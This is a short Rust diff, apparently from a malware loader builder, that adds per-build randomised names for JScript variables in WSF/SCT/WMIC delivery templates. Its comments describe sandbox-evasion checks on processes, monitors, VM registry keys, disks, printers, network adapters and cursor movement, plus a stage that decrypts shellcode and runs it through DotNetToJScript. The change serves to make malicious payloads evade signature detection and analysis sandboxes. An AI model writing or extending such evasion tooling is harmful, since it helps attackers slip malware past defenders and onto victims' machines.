@@ -276,6 +276,29 @@ fn build_context(config: &LoaderConfig) -> Context {
     ] {
         vars.insert(k, rand_ident(7));
     }
+    // JScript local variable names in WSF/SCT/WMIC sandbox+exec — randomised per build
+    for k in &[
+        // sandbox: process check, monitor check
+        "jsc_lv_wmi", "jsc_lv_pq", "jsc_lv_bad", "jsc_lv_e", "jsc_lv_n",
+        "jsc_lv_mq", "jsc_lv_em", "jsc_lv_d",
+        // sandbox: registry XOR vars
+        "jsc_lv_sh", "jsc_lv_vmr", "jsc_lv_vmx", "jsc_lv_ri",
+        "jsc_lv_sh2", "jsc_lv_vbr", "jsc_lv_vbx", "jsc_lv_ri2",
+        // sandbox: disk + printer + NIC + env
+        "jsc_lv_fso", "jsc_lv_drv",
+        "jsc_lv_wmi2", "jsc_lv_prq", "jsc_lv_pc", "jsc_lv_ep2",
+        "jsc_lv_wmi3", "jsc_lv_naq", "jsc_lv_nac", "jsc_lv_ena",
+        "jsc_lv_envobj",
+        // exec: cursor check
+        "jsc_lv_cx", "jsc_lv_cy",
+        "jsc_lv_a1", "jsc_lv_w1", "jsc_lv_t1", "jsc_lv_pp1", "jsc_lv_ps1",
+        "jsc_lv_a2", "jsc_lv_w2", "jsc_lv_t2", "jsc_lv_pp2", "jsc_lv_ps2",
+        "jsc_lv_cx2", "jsc_lv_cy2", "jsc_lv_ts",
+        // exec: decryption + DotNetToJScript
+        "jsc_lv_k", "jsc_lv_ki", "jsc_lv_sc", "jsc_lv_loader", "jsc_lv_stub", "jsc_lv_asm", "jsc_lv_mi",
+    ] {
+        vars.insert(k, rand_ident(7));
+    }
     // HTA (VBScript) local variable names — randomised per build
     for k in &[
         // fn_sandbox vars
